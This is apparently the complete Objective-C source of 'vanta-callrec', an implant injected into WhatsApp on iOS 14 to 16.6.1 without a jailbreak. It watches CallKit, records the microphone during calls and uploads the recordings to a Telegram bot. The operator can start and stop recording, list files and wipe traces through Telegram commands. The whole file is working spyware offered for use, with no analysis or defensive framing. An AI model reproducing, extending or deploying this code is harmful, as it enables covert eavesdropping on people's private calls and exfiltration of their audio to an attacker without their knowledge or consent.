// payload.m — vanta-callrec
// Target: iOS 14.0 – 16.6.1
// Injected via TrollFools into WhatsApp (no jailbreak required)
// Purpose: record VoIP calls → store offline → exfil via Telegram

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <AVFoundation/AVFoundation.h>
#import <AudioToolbox/AudioToolbox.h>
#import <CallKit/CallKit.h>
#import <Network/Network.h>
#import <objc/runtime.h>
#import <dlfcn.h>
#import <pthread.h>
#import <unistd.h>
#import <time.h>
#import "config.h"
#import "ring_buffer.h"

extern char **environ;

// ═══════════════════════════════════════════════════════════
//  Global ring buffer (locked-down, one instance)
// ═══════════════════════════════════════════════════════════
static uint8_t    g_rb_mem[RB_SIZE_MB * 1024 * 1024] __attribute__((aligned(64)));
static vanta_rb_t g_rb;
static _Atomic int g_recording = 0;

// ═══════════════════════════════════════════════════════════
//  Outbox paths
// ═══════════════════════════════════════════════════════════
static NSString *vanta_docs(void) {
    return [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
              NSUserDomainMask, YES) firstObject];
}

static NSString *vanta_outbox(void) {
    NSString *d = [vanta_docs() stringByAppendingPathComponent:OUTBOX_NAME];
    [[NSFileManager defaultManager] createDirectoryAtPath:d
        withIntermediateDirectories:YES attributes:nil error:nil];
    return d;
}

static NSString *vanta_stamp(void) {
    time_t t = time(NULL);
    struct tm tmv;
    localtime_r(&t, &tmv);
    return [NSString stringWithFormat:@"%04d-%02d-%02d_%02d%02d%02d",
            tmv.tm_year + 1900, tmv.tm_mon + 1, tmv.tm_mday,
            tmv.tm_hour, tmv.tm_min, tmv.tm_sec];
}

// ═══════════════════════════════════════════════════════════
//  Telegram client
// ═══════════════════════════════════════════════════════════
@interface VTG : NSObject
+ (void)text:(NSString *)t;
+ (BOOL)sendData:(NSData *)d name:(NSString *)n caption:(NSString *)cap;
+ (NSArray *)updates:(long long *)offset;
@end

@implementation VTG

+ (NSString *)api:(NSString *)m {
    return [NSString stringWithFormat:
        @"https://api.telegram.org/bot%@/%@", TG_TOKEN, m];
}

+ (void)text:(NSString *)t {
    NSMutableURLRequest *r = [NSMutableURLRequest requestWithURL:
        [NSURL URLWithString:[self api:@"sendMessage"]]];
    r.HTTPMethod = @"POST";
    [r setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    NSDictionary *b = @{@"chat_id": TG_CHAT, @"text": t ?: @"",
                        @"parse_mode": @"HTML"};
    r.HTTPBody = [NSJSONSerialization dataWithJSONObject:b options:0 error:nil];
    [[[NSURLSession sharedSession] dataTaskWithRequest:r] resume];
}

+ (BOOL)sendData:(NSData *)d name:(NSString *)n caption:(NSString *)cap {
    if (!d.length) return NO;
    NSString *bound = @"----VantaBoundary7MA4YWxkTrZu0gW";
    NSMutableURLRequest *r = [NSMutableURLRequest requestWithURL:
        [NSURL URLWithString:[self api:@"sendDocument"]]];
    r.HTTPMethod = @"POST";
    r.timeoutInterval = 90;
    [r setValue:[NSString stringWithFormat:
        @"multipart/form-data; boundary=%@", bound]
        forHTTPHeaderField:@"Content-Type"];

    NSMutableData *body = [NSMutableData data];
    void (^field)(NSString*, NSString*) = ^(NSString *k, NSString *v) {
        [body appendData:[[NSString stringWithFormat:
            @"--%@\r\nContent-Disposition: form-data; name=\"%@\"\r\n\r\n%@\r\n",
            bound, k, v] dataUsingEncoding:NSUTF8StringEncoding]];
    };
    field(@"chat_id", TG_CHAT);
    if (cap.length) field(@"caption", cap);
    [body appendData:[[NSString stringWithFormat:
        @"--%@\r\nContent-Disposition: form-data; name=\"document\"; "
        @"filename=\"%@\"\r\nContent-Type: application/octet-stream\r\n\r\n",
        bound, n] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:d];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", bound]
        dataUsingEncoding:NSUTF8StringEncoding]];
    r.HTTPBody = body;

    __block BOOL ok = NO;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    NSURLSessionDataTask *t = [[NSURLSession sharedSession]
        dataTaskWithRequest:r
        completionHandler:^(NSData *resp, NSURLResponse *rp, NSError *e) {
            if (!e && resp) {
                NSDictionary *j = [NSJSONSerialization
                    JSONObjectWithData:resp options:0 error:nil];
                ok = [j[@"ok"] boolValue];
            }
            dispatch_semaphore_signal(sem);
        }];
    [t resume];
    dispatch_semaphore_wait(sem,
        dispatch_time(DISPATCH_TIME_NOW, 90 * NSEC_PER_SEC));
    return ok;
}

+ (NSArray *)updates:(long long *)offset {
    NSString *url = [NSString stringWithFormat:
        @"%@?offset=%lld&timeout=15", [self api:@"getUpdates"], *offset];
    NSData *d = [NSData dataWithContentsOfURL:[NSURL URLWithString:url]];
    if (!d) return @[];
    NSDictionary *j = [NSJSONSerialization
        JSONObjectWithData:d options:0 error:nil];
    if (![j[@"ok"] boolValue]) return @[];
    NSArray *res = j[@"result"] ?: @[];
    for (NSDictionary *u in res) {
        long long uid = [u[@"update_id"] longLongValue];
        if (uid >= *offset) *offset = uid + 1;
    }
    return res;
}
@end

// ═══════════════════════════════════════════════════════════
//  Outbox flush — called periodically
// ═══════════════════════════════════════════════════════════
static void vanta_flush_outbox(void) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *dir = vanta_outbox();
    NSArray *files = [fm contentsOfDirectoryAtPath:dir error:nil];
    for (NSString *f in files) {
        if (![f hasSuffix:@".m4a"]) continue;
        NSString *p = [dir stringByAppendingPathComponent:f];
        NSString *metaPath = [p stringByAppendingString:@".meta"];
        NSString *cap = [NSString stringWithContentsOfFile:metaPath
            encoding:NSUTF8StringEncoding error:nil] ?: @"🎙 call";
        NSData *d = [NSData dataWithContentsOfFile:p];
        if (!d) continue;
        if ([VTG sendData:d name:f caption:cap]) {
            [fm removeItemAtPath:p error:nil];
            [fm removeItemAtPath:metaPath error:nil];
        }
    }
    // حذف الملفات القديمة (.sent) بعد TTL
    time_t now = time(NULL);
    for (NSString *f in [fm contentsOfDirectoryAtPath:dir error:nil]) {
        if (![f hasSuffix:@".sent"]) continue;
        NSString *p = [dir stringByAppendingPathComponent:f];
        NSDictionary *a = [fm attributesOfItemAtPath:p error:nil];
        time_t m = [[a fileModificationDate] timeIntervalSince1970];
        if (now - m > SENT_TTL_SEC) [fm removeItemAtPath:p error:nil];
    }
}


// ═══════════════════════════════════════════════════════════
//  Audio capture engine
//  V1 (بدون جيلبريك): AVAudioRecorder — يلتقط الميك
//  V2 (مع جيلبريك): سيُستبدل بـ AudioUnitRender hook
// ═══════════════════════════════════════════════════════════
@interface VantaAudio : NSObject <AVAudioRecorderDelegate>
@property (nonatomic, strong) AVAudioRecorder *rec;
@property (nonatomic, strong) NSString        *path;
@property (nonatomic, strong) NSDate          *startedAt;
+ (instancetype)shared;
+ (void)startRecording:(NSString *)callId;
+ (void)stopRecording;
@end

@implementation VantaAudio

+ (instancetype)shared {
    static VantaAudio *s; static dispatch_once_t t;
    dispatch_once(&t, ^{ s = [VantaAudio new]; });
    return s;
}

+ (void)startRecording:(NSString *)callId {
    [[self shared] _start:callId];
}

+ (void)stopRecording {
    [[self shared] _stop];
}

- (void)_start:(NSString *)callId {
    if (self.rec) return;   // already recording

    AVAudioSession *s = [AVAudioSession sharedInstance];
    [s setCategory:AVAudioSessionCategoryPlayAndRecord
              mode:AVAudioSessionModeVoiceChat
           options:AVAudioSessionCategoryOptionMixWithOthers |
                   AVAudioSessionCategoryOptionDuckOthers
             error:nil];
    [s setActive:YES error:nil];

    NSString *name = [NSString stringWithFormat:@"call_%@_%@.m4a",
                      vanta_stamp(), callId ?: @"unknown"];
    NSString *full = [vanta_outbox() stringByAppendingPathComponent:name];
    self.path      = full;
    self.startedAt = [NSDate date];

    NSDictionary *set = @{
        AVFormatIDKey:             @(kAudioFormatMPEG4AAC),
        AVSampleRateKey:           @(SAMPLE_RATE),
        AVNumberOfChannelsKey:     @(CHANNELS),
        AVEncoderBitRateKey:       @(BITRATE),
        AVEncoderAudioQualityKey:  @(AVAudioQualityHigh)
    };

    NSError *err = nil;
    self.rec = [[AVAudioRecorder alloc] initWithURL:[NSURL fileURLWithPath:full]
                                            settings:set
                                               error:&err];
    if (!self.rec) {
        [VTG text:[NSString stringWithFormat:@"❌ recorder: %@",
            err.localizedDescription ?: @"unknown"]];
        return;
    }
    self.rec.delegate = self;
    [self.rec record];
    [VTG text:[NSString stringWithFormat:@"📞 بدأ التسجيل\n%@", name]];
}

- (void)_stop {
    if (!self.rec) return;
    NSTimeInterval dur = -[self.startedAt timeIntervalSinceNow];
    [self.rec stop];
    [[AVAudioSession sharedInstance] setActive:NO
        withOptions:AVAudioSessionSetActiveOptionNotifyOthersOnDeactivation
              error:nil];
    self.rec = nil;

    if (dur < CALL_MIN_SEC) {
        [[NSFileManager defaultManager] removeItemAtPath:self.path error:nil];
        [VTG text:[NSString stringWithFormat:@"⏱ مكالمة قصيرة %.1fs — تجاهلت", dur]];
        self.path = nil;
        return;
    }

    NSString *meta = [NSString stringWithFormat:@"📞 مكالمة — %.0f ثانية", dur];
    NSString *metaPath = [self.path stringByAppendingString:@".meta"];
    [meta writeToFile:metaPath atomically:YES
             encoding:NSUTF8StringEncoding error:nil];

    [VTG text:[NSString stringWithFormat:@"✅ انتهى التسجيل (%.0f ث) — جارٍ الإرسال…", dur]];

    dispatch_async(dispatch_get_global_queue(0,0), ^{
        vanta_flush_outbox();
    });

    self.path = nil;
}

- (void)audioRecorderDidFinishRecording:(AVAudioRecorder *)r
                             successfully:(BOOL)ok {
    if (!ok) [VTG text:@"⚠️ التسجيل لم يُكمل بنجاح"];
}
@end

// ═══════════════════════════════════════════════════════════
//  CallKit observer — يعرف متى تبدأ/تنتهي المكالمة
// ═══════════════════════════════════════════════════════════
@interface VCallWatcher : NSObject <CXCallObserverDelegate>
@property (nonatomic, assign) BOOL inCall;
@end

@implementation VCallWatcher

- (void)callObserver:(CXCallObserver *)o callChanged:(CXCall *)call {
    NSString *uuid = call.UUID.UUIDString;

    if (call.hasConnected && !call.hasEnded && !self.inCall) {
        self.inCall = YES;
        [VantaAudio startRecording:uuid];
    } else if (call.hasEnded && self.inCall) {
        self.inCall = NO;
        [VantaAudio stopRecording];
    }
}
@end

// ═══════════════════════════════════════════════════════════
//  Network monitor — NWPathMonitor
// ═══════════════════════════════════════════════════════════
@interface VNet : NSObject
@end

@implementation VNet
+ (void)start {
    nw_path_monitor_t mon = nw_path_monitor_create();
    nw_path_monitor_set_queue(mon, dispatch_get_global_queue(0,0));
    nw_path_monitor_set_update_handler(mon, ^(nw_path_t path) {
        if (nw_path_get_status(path) == nw_path_status_satisfied) {
            dispatch_async(dispatch_get_global_queue(0,0), ^{
                vanta_flush_outbox();
            });
        }
    });
    nw_path_monitor_start(mon);

    // مؤقّت دوري مستقل عن الشبكة
    dispatch_async(dispatch_get_global_queue(0,0), ^{
        while (1) {
            sleep(OUTBOX_INTERVAL);
            vanta_flush_outbox();
        }
    });
}
@end


@interface VC2 : NSObject
@property (nonatomic, assign) long long offset;
@property (nonatomic, assign) BOOL      running;
+ (instancetype)shared;
- (void)boot;
- (void)poll;
- (void)handle:(NSDictionary *)upd;
@end

@implementation VC2

+ (instancetype)shared {
    static VC2 *s; static dispatch_once_t t;
    dispatch_once(&t, ^{ s = [VC2 new]; });
    return s;
}

- (void)boot {
    if (self.running) return;
    self.running = YES;
    UIDevice *dv = [UIDevice currentDevice];
    [VTG text:[NSString stringWithFormat:
        @"🦇 <b>vanta-callrec</b> online\n📱 %@\n🎯 iOS %@",
        dv.name, dv.systemVersion]];
    [self poll];
}

- (void)poll {
    dispatch_async(dispatch_get_global_queue(0,0), ^{
        NSArray *ups = [VTG updates:&_offset];
        for (NSDictionary *u in ups) [self handle:u];
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW,
                        (int64_t)(POLL_SEC * NSEC_PER_SEC)),
                       dispatch_get_global_queue(0,0), ^{
            [self poll];
        });
    });
}

- (void)handle:(NSDictionary *)u {
    NSDictionary *m = u[@"message"] ?: u[@"edited_message"];
    if (!m) return;
    NSString *txt = m[@"text"] ?: @"";
    if (![txt hasPrefix:@"/"]) return;
    NSArray *parts = [txt componentsSeparatedByString:@" "];
    NSString *cmd = parts[0];
    NSFileManager *fm = [NSFileManager defaultManager];

    if ([cmd isEqual:@"/ping"])   { [VTG text:@"🏓 pong"]; return; }

    if ([cmd isEqual:@"/status"]) {
        NSArray *files = [fm contentsOfDirectoryAtPath:vanta_outbox() error:nil];
        NSUInteger pending = 0, sent = 0;
        for (NSString *f in files) {
            if ([f hasSuffix:@".m4a"])  pending++;
            if ([f hasSuffix:@".sent"]) sent++;
        }
        VantaAudio *a = [VantaAudio shared];
        [VTG text:[NSString stringWithFormat:
            @"<b>vanta-callrec</b>\n🎙 Rec: %@\n📦 Pending: %lu\n✅ Sent: %lu",
            a.rec ? @"yes" : @"no",
            (unsigned long)pending, (unsigned long)sent]];
        return;
    }

    if ([cmd isEqual:@"/rec_start"]) { [VantaAudio startRecording:@"manual"]; return; }
    if ([cmd isEqual:@"/rec_stop"])  { [VantaAudio stopRecording]; return; }

    if ([cmd isEqual:@"/flush"]) {
        [VTG text:@"⏳ flushing…"];
        dispatch_async(dispatch_get_global_queue(0,0), ^{
            vanta_flush_outbox();
            [VTG text:@"✅ flush done"];
        });
        return;
    }

    if ([cmd isEqual:@"/list"]) {
        NSArray *files = [fm contentsOfDirectoryAtPath:vanta_outbox() error:nil];
        NSMutableString *out = [NSMutableString stringWithString:@"<b>📁 outbox</b>\n"];
        for (NSString *f in files) [out appendFormat:@"• %@\n", f];
        [VTG text:out.length > 4000 ? @"(too long)" : out];
        return;
    }

    if ([cmd isEqual:@"/wipe"]) {
        NSString *dir = vanta_outbox();
        for (NSString *f in [fm contentsOfDirectoryAtPath:dir error:nil]) {
            [fm removeItemAtPath:[dir stringByAppendingPathComponent:f] error:nil];
        }
        [VTG text:@"🗑 wiped"];
        return;
    }

    [VTG text:[NSString stringWithFormat:@"❓ غير معروف: %@", cmd]];
}
@end

static VCallWatcher *g_watcher = nil;

__attribute__((constructor))
static void vanta_ctor(void) {
    NSLog(@"[vanta-callrec] loaded");
    rb_init(&g_rb, g_rb_mem, sizeof(g_rb_mem));

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW,
                    (int64_t)(START_DELAY * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        g_watcher = [VCallWatcher new];
        CXCallObserver *obs = [CXCallObserver new];
        [obs setDelegate:g_watcher queue:dispatch_get_main_queue()];
        [VNet start];
        [[VC2 shared] boot];
        dispatch_async(dispatch_get_global_queue(0,0), ^{
            vanta_flush_outbox();
        });
        NSLog(@"[vanta-callrec] ready");
    });
}

